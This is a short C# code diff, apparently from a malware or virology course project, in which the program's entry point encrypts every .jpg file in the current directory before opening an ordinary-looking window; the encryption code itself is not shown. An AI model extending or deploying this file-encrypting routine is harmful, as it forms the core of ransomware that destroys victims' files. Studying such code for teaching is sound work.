@@ -15,7 +15,7 @@ namespace Virologie
         {
             FileExplorer explorer = new FileExplorer();
             FileEncrypter encrypter = new FileEncrypter();
-            explorer.ExploreAndApply("*.jpg", encrypter.Encrypt);
+            explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
